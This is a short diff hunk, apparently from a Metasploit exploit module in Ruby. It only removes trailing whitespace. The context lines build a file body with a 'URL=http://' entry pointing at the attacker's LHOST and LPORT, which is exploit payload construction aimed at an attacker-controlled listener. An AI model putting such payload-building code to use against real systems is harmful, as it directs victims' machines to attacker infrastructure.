@@ -51,7 +51,7 @@ module Metasploit3
 		c << "URL=http://#{datastore["LHOST"]}"
 		c << ":#{datastore["LPORT"]}" if datastore["LPORT"]
 		c << "/INITJM\n"
-		
+
 		c
 	end
 
